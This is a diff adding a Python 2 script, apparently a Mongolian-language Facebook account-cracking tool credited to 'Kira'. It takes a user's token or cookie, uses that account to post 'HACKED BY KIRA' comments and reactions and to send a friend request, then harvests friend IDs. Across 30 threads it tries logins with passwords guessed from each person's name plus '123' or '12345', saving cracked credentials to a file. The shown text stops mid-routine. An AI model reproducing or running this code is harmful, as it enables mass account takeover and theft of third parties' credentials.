@@ -1,0 +1,1737 @@
+#!/usr/bin/python2
+# coding=utf-8
+import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
+from multiprocessing.pool import ThreadPool
+
+
+P  = '\033[1;97m'  
+M  = '\033[1;91m'
+H  = '\033[1;92m' 
+K = '\033[1;93m' 
+B  = '\033[1;94m' 
+U  = '\033[1;95m' 
+O = '\033[1;96m' 
+
+my_color = [P, M, H, K, B, U, O]
+warna = random.choice(my_color)
+warni = random.choice(my_color)
+
+try:
+	import mechanize
+except ImportError:
+	os.system("pip2 install mechanize")
+try:
+	import requests
+except ImportError:
+	os.system("pip2 install requests")
+	os.system("python2 kira.py")
+from requests.exceptions import ConnectionError
+from mechanize import Browser
+from datetime import datetime
+
+reload(sys)
+sys.setdefaultencoding('utf8')
+br = mechanize.Browser()
+br.set_handle_robots(False)
+br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
+br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+
+os.system("clear")
+done = False
+def animate():
+    for c in itertools.cycle(['\033[1;96m|', '\033[1;92m/', '\033[1;95m-', '\033[1;91m\\']):
+        if done:
+            break
+        sys.stdout.write('\r\033[1;93mУншиж Байна ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
+        sys.stdout.flush()
+        time.sleep(0.1)
+ 
+t = threading.Thread(target=animate)
+t.start()
+ 
+time.sleep(5)
+done = True
+
+def keluar():
+	print "\033[1;97m{\033[1;91m!\033[1;97m} Гарах"
+	os.sys.exit()
+	
+def tok():
+    titik = [
+     '.   ', '..  ', '... ', '.   ', '..  ', '... ', '.   ', '..  ', '... ']
+    for ah in titik:
+        print '\r\x1b[0;97m [\x1b[0;93m*\x1b[0;97m] Уншиж Байна \x1b[0;92m' + ah,
+        sys.stdout.flush()
+        time.sleep(1)
+        
+def acak(x):
+    w = 'mhkbpcP'
+    d = ''
+    for i in x:
+        d += '!'+w[random.randint(0,len(w)-1)]+i
+    return cetak(d)
+    
+    
+def cetak(x):
+    w = 'mhkbpcP'
+    for i in w:
+        j = w.index(i)
+        x= x.replace('!%s'%i,'%s;'%str(31+j))
+    x += ''
+    x = x.replace('!0','')
+    sys.stdout.write(x+'\n')
+
+
+def jalan(z):
+	for e in z + '\n':
+		sys.stdout.write(e)
+		sys.stdout.flush()
+		time.sleep(0.03)
+		
+#########LOGO#########
+logo = """ \033[1;91mМонгол Түүл
+\033[1;97m Шифрийг тайлсан:Кира
+\033[1;94m──────────────────────────────────────────────────
+\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mDecrypted\033[1;91m: \033[1;96mKira
+\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mGithub   \033[1;91m: \033[1;96mGithub.com/Kira-Shishigami
+\033[1;95m{\033[1;96m×\033[1;95m} \033[1;93mFacebook \033[1;91m: \033[1;96mFacebook.com/imkirashishigami"""
+
+back = 0
+threads = []
+berhasal = []
+cekpoint = []
+oks = []
+oke = []
+id = []
+
+
+def masuk():
+	os.system('clear')
+	print logo
+	print 50* "\033[1;94m─"
+	print "\033[1;97m{\033[1;92m01\033[1;97m} Фэйсбүүк Токенээр нэвтрэх"
+	print "\033[1;97m{\033[1;92m02\033[1;97m} Token App татах"
+	print "\033[1;97m{\033[1;92m03\033[1;97m} Cookie ээр нэвтрэх"
+	print "\033[1;97m{\033[1;92m04\033[1;97m} Link рүү үсрэх"
+	print "\033[1;97m{\033[1;91m00\033[1;97m} Гарах"
+	print 50* "\033[1;94m─"
+	pilih_masuk()
+
+def pilih_masuk():
+	msuk = raw_input("\033[1;90mKira \033[91m:\033[1;92m ")
+	if msuk =="":
+		print"\033[1;97m[\033[1;91m!\033[1;97m] Буруу сонголт!"
+		pilih_masuk()
+	elif msuk =="1" or msuk =="01":
+		tokenz()
+	elif msuk =="2"or msuk =="02":
+		ambil_token()
+	elif msuk =="3"or msuk =="03":
+		gen()
+	elif msuk =="4"or msuk =="04":
+		ambil_link()
+	elif msuk =="0" or msuk =="00":
+		keluar()
+	else:
+		print"\033[1;97m[\033[1;91m!\033[1;97m] Буруу Сонголт"
+		pilih_masuk()
+			
+####COOKIE####
+def gen():
+    os.system('clear')
+    print logo
+    cookie = raw_input('\n \x1b[1;97m[?] Cookie Тавина уу :\x1b[1;92m ')
+    tok()
+    try:
+        data = requests.get('https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_', headers={'user-agent': 'Mozilla/5.0 (Linux; Android 10; SM-A205S) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
+           'referer': 'https://m.facebook.com/', 
+           'host': 'm.facebook.com', 
+           'origin': 'https://m.facebook.com', 
+           'upgrade-insecure-requests': '1', 
+           'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 
+           'cache-control': 'max-age=10', 
+           'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', 
+           'content-type': 'text/html; charset=utf-8'}, cookies={'cookie': cookie})
+        find_token = re.search('(EAAA\\w+)', data.text)
+        hasil = '\n* Fail : maybe your cookie invalid !!' if find_token is None else '\n* Your fb access token : ' + find_token.group(1)
+    except requests.exceptions.ConnectionError:
+        print '\n [!] Интернэт холболт шалгана уу'
+
+    cookie = open('login.txt', 'w')
+    cookie.write(find_token.group(1))
+    cookie.close()
+    jalan('\n\n \x1b[1;97m[\x1b[1;92m\xe2\x88\x9a\x1b[1;97m]\x1b[1;92m Амжилттай Нэвтэрлээ')
+    bot_komen()
+    return
+
+
+
+#####LOGIN_TOKENZ#####
+def tokenz():
+	os.system('clear')
+	print logo
+	print 50* "\033[1;94m─"
+	toket = raw_input("\033[1;97m{\033[1;95m?\033[1;97m} Token \033[1;91m:\033[1;92m ")
+	try:
+		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
+		a = json.loads(otw.text)
+		zedd = open("login.txt", 'w')
+		zedd.write(toket)
+		zedd.close()
+		print '\033[1;97m{\033[1;92m✓\033[1;97m}\033[1;92m Нэвтрэлт Амжилттай'
+		os.system('xdg-open https://m.facebook.com/imkirashishigami')
+		bot_komen()
+	except KeyError:
+		print "\033[1;97m{\033[1;91m!\033[1;97m} \033[1;91mАлдаатай Token !"
+		time.sleep(1.7)
+		masuk()
+
+
+
+######AMBIL_TOKEN######
+def ambil_token():
+	os.system("clear")
+	print logo
+	print 50* "\033[1;94m─"
+	jalan("        \033[1;92mBrowser-ээр татах ...")
+	os.system('xdg-open https://drive.google.com/file/d/1eAuQG4aFIH49r0ACpoUWspnSG2VUl4Ci/view?usp=drivesdk')
+	time.sleep(2)
+	masuk()
+	
+##### AMBIL LINK #####
+def ambil_link():
+	os.system("clear")
+	print logo
+	print 50* "\033[1;94m─"
+	jalan("\033[1;92mОдоо та browser ороод...")
+	jalan("\033[1;92mFind in Page хэсэг дарж ...")
+	jalan("\033[1;92mХайх хэсэг дээр EAA...")
+	jalan("\033[1;92mДарж гарч ирсэн текст хуулна уу...")
+	os.system ("cd ... && npm install")
+	jalan ("\033[1;96mАмжилт...")
+	os.system ("cd ... && npm start")
+	raw_input("\n[ Буцах ]")
+	masuk()
+	
+###### BOT KOMEN #######
+def bot_komen():
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;97m[!] Cookie Устсан"
+		os.system('rm -rf login.txt')
+	una = ('100019427860230')
+	kom = ('HACKED BY KIRA😘')
+	reac = ('ANGRY')
+	post = ('739138050077117')
+	post2 = ('702291493761773')
+	kom2 = ('HACKED BY KIRA 😁')
+	reac2 = ('LOVE')
+	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
+	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
+	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
+	menu()
+
+###### MENU #######
+def menu():
+	os.system('clear')
+	try:
+		toket = open('login.txt','r').read()
+	except IOError:
+		print "{!} Cookie Устсан"
+		os.system('clear')
+		os.system('rm -rf login.txt')
+		masuk()
+	try:
+		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
+		a = json.loads(otw.text)
+		nama = a['name']
+		id = a['id']
+	except KeyError:
+		os.system('clear')
+		print"\033[1;96m[!] \033[1;91mCookie Устсан"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		masuk()
+		time.sleep(1)
+		masuk()
+	except requests.exceptions.ConnectionError:
+		print"{!} Интернэт холболтоо шалгана уу"
+		keluar()
+	os.system("clear")
+	print logo
+	print 50* "\033[1;94m─"
+	print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m Нэр\033[1;90m    =>\033[1;92m " +nama
+	print "\033[1;97m{\033[1;96m•\033[1;97m}\033[1;95m АяДи ID\033[1;90m =>\033[1;92m " + id
+	print 50* "\033[1;94m─"
+	print "\033[1;97m{"+warni+"01\033[1;97m}"+warna+" Найзын Жагсаалтаас Хакдах"
+	print "\033[1;97m{"+warni+"02\033[1;97m}"+warna+" Устсан"
+	print "\033[1;97m{"+warni+"03\033[1;97m}"+warna+" Дагагчдаас Хакдах"
+	print "\033[1;97m{"+warni+"04\033[1;97m}"+warna+" Устсан"
+	print "\033[1;97m{"+warni+"05\033[1;97m}"+warna+" Устсан"
+	print "\033[1;97m{\033[1;91m00\033[1;97m}"+warna+" Гарах"
+	print 50* "\033[1;94m─"
+	pilih()
+	
+######PILIH######
+def pilih():
+	unikers = raw_input("\033[1;92mСонгох \033[91m:\033[1;92m ")
+	if unikers =="":
+		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97mБуруу Сонголт "
+		pilih()
+	elif unikers =="1" or unikers =="01":
+		crack_teman()
+	elif unikers =="2" or unikers =="02":
+		crack_likes()
+	elif unikers =="3" or unikers =="03":
+		crack_follow()
+	elif unikers =="4" or unikers =="04":
+		user_id()
+	elif unikers =="5" or unikers =="05":
+		perbarui()
+	elif unikers =="0" or unikers =="00":
+		os.system('clear')
+		jalan('Алдаатай токен')
+		os.system('rm -rf login.txt')
+		keluar()
+	else:
+		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Сонголт !"
+		pilih()
+		
+##### CRACK TEMAN/PUBLIK #####
+def crack_teman():
+	os.system("clear")
+	print logo
+	print 50* "\033[1;94m─"
+	print "\033[1;97m{"+warna+"01\033[1;97m}"+warni+" Монгол Улсаас"
+	print "\033[1;97m{"+warna+"02\033[1;97m}"+warni+" Бангладеш Улсаас"
+	print "\033[1;97m{"+warna+"03\033[1;97m}"+warni+" Америк Улсаас"
+	print "\033[1;97m{"+warna+"04\033[1;97m}"+warni+" Пакистан Улсаас"
+	print "\033[1;97m{\033[1;91m00\033[1;97m}"+warni+" Буцах"
+	print 50* "\033[1;94m─"
+	pilih_teman()
+	
+######PILIH######
+def pilih_teman():
+	univ = raw_input(""+warna+"Сонгох \033[91m:\033[1;92m ")
+	if univ =="":
+		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Сонголт !"
+		pilih_teman()
+	elif univ =="1" or univ =="01":
+		crack_indo()
+	elif univ =="2" or univ =="02":
+		crack_bangla()
+	elif univ =="3" or univ =="03":
+		crack_usa()
+	elif univ =="4" or univ =="04":
+		crack_pakis()
+	elif univ =="5" or univ =="05":
+		univ()
+	elif univ =="0" or univ =="00":
+		menu()
+	else:
+		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Сонголт !"
+		pilih_teman()
+		
+##### Crack from Монгол #####
+def crack_indo():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;96m[!] \x1b[1;91mCookie Устсан"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+	os.system('clear')
+	print logo
+	print 50* "\033[1;94m─"
+	print "\033[1;97m{\033[1;93m01\033[1;97m} Өөрийн Найзын Жагсаалтаас"
+	print "\033[1;97m{\033[1;93m02\033[1;97m} Нийтэд ил Найзын Жагсаалтаас"
+	print "\033[1;97m{\033[1;93m03\033[1;97m} Файлаас"
+	print "\033[1;97m{\033[1;91m00\033[1;97m} Буцах"
+	print 50* "\033[1;94m─"
+	pilih_indo()
+
+#### PILIH Монгол ####
+def pilih_indo():
+	teak = raw_input("\033[1;93mСонгох \033[91m:\033[1;92m ")
+	if teak =="":
+		print"\033[1;97m{\033[1;91m!\033[1;97m}\033[1;97m Сонголт !"
+		pilih_indo()
+	elif teak =="1" or teak =="01":
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("             \033[1;93m●●● \033[1;97mМонгол улсаас \033[1;93m●●●")
+		print 50* "\033[1;94m─"
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif teak =="2" or teak =="02":
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("             \033[1;93m●●● \033[1;97mМонгол улсаас \033[1;93m●●●")
+		print 50* "\033[1;94m─"
+		idt = raw_input("\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mНийтэд ил Найзын жагсаалтаас \033[1;91m:\033[1;92m ")
+		try:
+			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
+			sp = json.loads(pok.text)
+			print"\033[1;97m{\033[1;93m●\033[1;97m}\033[1;93m Нэр \033[1;91m:\033[1;92m "+sp["name"]
+		except KeyError:
+			print"\033[1;97m{\033[1;91m!\033[1;97m} Буруу ID !"
+			raw_input("\n\033[1;93m{\033[1;97m<Буцах>\033[1;93m}")
+			crack_indo()
+		except requests.exceptions.ConnectionError:
+			print"\033[1;97m{\033[1;91m!\033[1;97m} Интернэт холболтоо шалгана уу !"
+			keluar()
+		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif teak =="3" or teak =="03":
+		os.system('clear')
+		print logo
+		try:
+			print 50* "\033[1;94m─"
+			print ("             \033[1;93m●●● \033[1;97mМонгол Улсаас \033[1;93m●●●")
+			print 50* "\033[1;94m─"
+			idlist = raw_input('\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mНэр File\033[1;91m :\033[1;92m ')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except KeyError:
+			print '\033[1;97m{\033[1;91m!\033[1;97m} Файл алга ! '
+			raw_input('\n\033[1;92m[ \033[1;97mБуцах \033[1;92m]')
+		except IOError:
+			print '\033[1;97m{\033[1;91m!\033[1;97m} Файл алга !'
+			raw_input("\n\033[1;93m{\033[1;97m<Буцах>\033[1;93m}")
+			crack_indo()
+	elif teak =="0" or teak =="00":
+		menu()
+	else:
+		print"\033[1;97m[\033[1;91m!\033[1;97m]\033[1;97m Сонголт !"
+		pilih_indo()
+	
+	print "\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mНийт ID \033[1;91m:\033[1;92m "+str(len(id))
+	print('\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mЗогсоох бол CTRL+Z')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mАжиллаж байна"+o),;sys.stdout.flush();time.sleep(1)
+	print("\n\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mАжиллахгүй байвал Airplane mode асааж унтраана уу")
+	print ("\033[1;94m──────────────────────────────────────────────────")
+	
+##### MAIN Mongolia #####
+	def main(arg):
+		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
+		global cekpoint,oks
+		zowe = arg
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+		try:
+			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
+			j = json.loads(an.text)
+			bos1 = j['first_name'].title()+'123'
+			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+			ko = json.load(data)
+			if 'access_token' in ko:
+				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m    > \x1b[1;92m") + zowe
+				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos1
+				oke = open("done/mngl.txt", "a")
+				oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+				oke.close()
+				oks.append(zowe)
+			else:
+				if 'www.facebook.com' in ko['error_msg']:
+					print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mЦООЖТОЙ")
+					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;93m") + j['name']
+					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} АяДи  \x1b[1;91m    > \x1b[1;93m") + zowe
+					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;93m") + bos1
+					cek = open("done/mngl.txt", "a")
+					cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos1+"\n")
+					cek.close()
+					cekpoint.append(zowe)
+				else:
+					bos2 = j['first_name'].title()+'12345'
+					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+					ko = json.load(data)
+					if 'access_token' in ko:
+						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m    > \x1b[1;92m") + zowe
+						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos2
+						oke = open("done/mngl.txt", "a")
+						oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+						oke.close()
+						oks.append(zowe)
+					else:
+						if 'www.facebook.com' in ko['error_msg']:
+							print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mЦООЖТОЙ")
+							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;93m") + j['name']
+							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} АяДи  \x1b[1;91m    > \x1b[1;93m") + zowe
+							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;93m") + bos2
+							cek = open("done/mngl.txt", "a")
+							cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos2+"\n")
+							cek.close()
+							cekpoint.append(zowe)
+						else:
+							bos3 = j['last_name'].title()+'123'
+							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+							ko = json.load(data)
+							if 'access_token' in ko:
+								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m    > \x1b[1;92m") + zowe
+								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos3
+								oke = open("done/mngl.txt", "a")
+								oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+								oke.close()
+								oks.append(zowe)
+							else:
+								if 'www.facebook.com' in ko['error_msg']:
+									print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mЦООЖТОЙ")
+									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;93m") + j['name']
+									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} АяДи  \x1b[1;91m    > \x1b[1;93m") + zowe
+									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;93m") + bos3
+									cek = open("done/mngl.txt", "a")
+									cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos3+"\n")
+									cek.close()
+									cekpoint.append(zowe)
+								else:
+									bos4 = j['last_name'].title()+'12345'
+									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
+									ko = json.load(data)
+									if 'access_token' in ko:
+										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mАмжилттай")
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;92m") + j['name']
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} АяДи  \x1b[1;91m    > \x1b[1;92m") + zowe
+										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;92m") + bos4
+										oke = open("done/mngl.txt", "a")
+										oke.write("\n{×} Амжилттай \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+										oke.close()
+										oks.append(zowe)
+									else:
+										if 'www.facebook.com' in ko['error_msg']:
+											print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mЦООЖТОЙ")
+											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Нэр  \x1b[1;91m    > \x1b[1;93m") + j['name']
+											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} АяДи  \x1b[1;91m    > \x1b[1;93m") + zowe
+											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Нууц үг  \x1b[1;91m> \x1b[1;93m") + bos4
+											cek = open("done/mngl.txt", "a")
+											cek.write("\n{×} Цоожтой \n{×} Нэр     > " +j['name']+ "\n{×} АяДи     > " +zowe+ "\n{×} Нууц үг > " +bos4+"\n")
+											cek.close()
+											cekpoint.append(zowe)
+														
+																			
+		except:
+			pass
+			
+	p = ThreadPool(30)
+	p.map(main, id)
+	print "\n\033[1;94m──────────────────────────────────────────────────"
+	print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mАмжилттай дууслаа ...'
+	print"\033[1;97m{\033[1;93m●\033[1;97m} \033[1;93mНийт \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;97m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
+	print '\033[1;97m{\033[1;93m●\033[1;97m} \033[1;92mOK\033[1;97m/\x1b[1;93mCP \033[1;93mФайл Хадгалсан \033[1;91m: \033[1;92mdone/mngl.txt'
+	print 50* "\033[1;94m─"
+	raw_input("\033[1;97m{<\033[1;93mБуцах\033[1;97m>}")
+	os.system("python2 kira.py")
+	
+##### Crack from Bangladesh #####
+def crack_bangla():
+	global toket
+	os.system('clear')
+	try:
+		toket=open('login.txt','r').read()
+	except IOError:
+		print"\033[1;97m{\x1b[1;91m!\x1b[1;97m} Cookie Алдаатай"
+		os.system('rm -rf login.txt')
+		time.sleep(1)
+		keluar()
+	os.system('clear')
+	print logo
+	print 50* "\033[1;94m─"
+	print "\033[1;97m{\033[1;96m01\033[1;97m} Өөрийн Найзын Жагсаалтаас"
+	print "\033[1;97m{\033[1;96m02\033[1;97m} Нийтэд ил Найзын Жагсаалтаас"
+	print "\033[1;97m{\033[1;96m03\033[1;97m} Файлаас"
+	print "\033[1;97m{\033[1;91m00\033[1;97m} Буцах"
+	print 50* "\033[1;94m─"
+	pilih_bangla()
+
+#### PILIH BANGLADESH ####
+def pilih_bangla():
+	teak = raw_input("\033[1;96mKira \033[91m:\033[1;92m ")
+	if teak =="":
+		print"\033[1;97m{\033[1;91m!\033[1;97m} Сонголт !"
+		pilih_bangla()
+	elif teak =="1" or teak =="01":
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("             \033[1;96m●●● \033[1;97mBangladesh Улсаас \033[1;96m●●●")
+		print 50* "\033[1;94m─"
+		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for s in z['data']:
+			id.append(s['id'])
+	elif teak =="2" or teak =="02":
+		os.system('clear')
+		print logo
+		print 50* "\033[1;94m─"
+		print ("             \033[1;96m●●● \033[1;97mBangladesh улсаас \033[1;96m●●●")
+		print 50* "\033[1;94m─"
+		idb = raw_input("\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Нийтэд ил Найзын Жагсаалтаас \033[1;91m:\033[1;92m ")
+		try:
+			pok = requests.get("https://graph.facebook.com/"+idb+"?access_token="+toket)
+			sp = json.loads(pok.text)
+			print"\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Нэр \033[1;91m:\033[1;92m "+sp["name"]
+		except KeyError:
+			print"\033[1;97m{\033[1;91m!\033[1;97m} ID  !"
+			raw_input("\n\033[1;96m{\033[1;97m<Буцах>\033[1;96m}")
+			crack_bangla()
+		except requests.exceptions.ConnectionError:
+			print"{!} Интернэт холболтоо шалгана уу !"
+			keluar()
+		r = requests.get("https://graph.facebook.com/"+idb+"/friends?access_token="+toket)
+		z = json.loads(r.text)
+		for i in z['data']:
+			id.append(i['id'])
+	elif teak =="3" or teak =="03":
+		os.system('clear')
+		print logo
+		try:
+			print 50* "\033[1;94m─"
+			print ("             \033[1;96m●●● \033[1;97mBangladesh улсаас \033[1;96m●●●")
+			print 50* "\033[1;94m─"
+			idlist = raw_input('\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Файлын нэр өгнө \033[1;91m:\033[1;92m ')
+			for line in open(idlist,'r').readlines():
+				id.append(line.strip())
+		except KeyError:
+			print '\033[1;97m{\033[1;91m!\033[1;97m} Файл алга ! '
+			raw_input('\n\033[1;92m[ \033[1;97mБуцах \033[1;92m]')
+		except IOError:
+			print '\033[1;97m{\033[1;91m!\033[1;97m} Файл алга !'
+			raw_input("\n\033[1;96m{\033[1;97m<Буцах>\033[1;96m}")
+			crack_bangla()
+	elif teak =="0" or teak =="00":
+		menu()
+	else:
+		print"\033[1;97m{\033[1;91m!\033[1;97m} Сонголт !"
+		pilih_bangla()
+	
+	print "\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Нийт ID \033[1;91m:\033[1;92m "+str(len(id))
+	print('\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Зогсоох бол CTRL+Z')
+	titik = ['.   ','..  ','... ']
+	for o in titik:
+		print("\r\033[1;97m{\033[1;96m●\033[1;97m}\033[1;96m Ажиллаж байна"+o),;sys.stdout.flush();time.sleep(1)
+	print("\n\033[1;97m{\033[1;96m●\033[1;97m} \033[1;96mАжиллахгүй байвал Airplane mode асаагаад унтраана уу")
+	print ("\033[1;94m──────────────────────────────────────────────────")
+	
+##### MAIN BANGLADESH #####
+	def main(arg):
+		sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S")));sys.stdout.flush()
+		global cekpoint,oks
+		zowe = arg
+		try:
+			os.mkdir('done')
+		except OSError:
+			pass
+		try:
+			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
+			j = json.loads(an.text)
+			bos1 = j['first_name'].lower()+'123'
